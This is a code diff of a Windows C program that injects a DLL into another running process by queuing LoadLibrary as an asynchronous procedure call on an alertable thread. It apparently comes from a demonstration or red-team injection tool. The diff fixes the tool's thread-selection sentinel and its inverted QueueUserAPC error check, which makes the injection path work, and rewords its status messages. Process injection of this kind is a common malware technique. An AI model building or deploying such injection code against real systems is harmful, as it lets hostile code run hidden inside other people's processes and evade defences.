@@ -176,8 +176,7 @@ int findAlertableThread(HANDLE hKernel32, int remoteThreadHandlesCount){
         CloseHandle(hProcess);
     }
 
-    HANDLE hAlertableThread = NULL;
-    DWORD index = 0;
+    DWORD index = -1;
     DWORD i = WaitForMultipleObjects(remoteThreadHandlesCount, eventHandlesArray, FALSE, 5000); //get index of alertable thread
     if(i != WAIT_TIMEOUT) {
         index = i;
@@ -210,13 +209,12 @@ int apcDllInjection(){
     }
         
     int index = findAlertableThread(hKernel32, remoteThreadHandlesCount);
+    if (index == -1){
+        return 10;
+    }
     HANDLE hAlertableThread = threadHandlesArray[index];
     pid = processPidsArray[index];
 
-    
-    if (hAlertableThread == NULL){
-        return 10;
-    }
 
     char *dllPath = (char *)dropDll();
     if (dllPath == 0){
@@ -239,7 +237,8 @@ int apcDllInjection(){
         return 5; //Could not write to remote process
     }
 
-    if(QueueUserAPC(loadLibraryAddress, hAlertableThread, (ULONG_PTR)allocAddress)){
+    if(QueueUserAPC(loadLibraryAddress, hAlertableThread, (ULONG_PTR)allocAddress) == 0){
+        printf("Error %d\n", GetLastError());
         return 9;
     }
 
@@ -252,37 +251,37 @@ int main(int argc, char *argv[]){
     switch (apcDllInjection())
     {
     case 0:
-        MessageBox(0,"Remote DLL injection successfull.","Success",0);
+        MessageBox(0,"DLL injection successfull.","Success",0);
         return 0;
     case 1:
-        MessageBox(0,"Remote DLL injection failed. Process does not exist.","Failure",0);
+        MessageBox(0,"DLL injection failed. Process does not exist.","Failure",0);
         return 1;
     case 2:
-        MessageBox(0,"Remote DLL injection failed. DLL could not be created.","Failure",0);
+        MessageBox(0,"DLL injection failed. DLL could not be created.","Failure",0);
         return 1;
     case 3:
-        MessageBox(0,"Remote DLL injection failed. Process could not be opened.","Failure",0);
+        MessageBox(0,"DLL injection failed. Process could not be opened.","Failure",0);
         return 1;
     case 4:
-        MessageBox(0,"Remote DLL injection failed. Could not allocate memory in remote process.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not allocate memory in remote process.","Failure",0);
         return 1;
     case 5:
-        MessageBox(0,"Remote DLL injection failed. Could not write to remote process.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not write to remote process.","Failure",0);
         return 1;
     case 6:
-        MessageBox(0,"Remote DLL injection failed. Could not found LoadLibrary function.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not found LoadLibrary function.","Failure",0);
         return 1;
     case 7:
-        MessageBox(0,"Remote DLL injection failed. Could not open remote thread.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not open remote thread.","Failure",0);
         return 1;
     case 8:
-        MessageBox(0,"Remote DLL injection failed. Could not get remote thread handles.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not get remote thread handles.","Failure",0);
         return 1;
     case 9:
-        MessageBox(0,"Remote DLL injection failed. Could not create APC.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not create APC.","Failure",0);
         return 1;
     case 10:
-        MessageBox(0,"Remote DLL injection failed. Could not find alertable thread.","Failure",0);
+        MessageBox(0,"DLL injection failed. Could not find alertable thread.","Failure",0);
         return 1;
     }
     
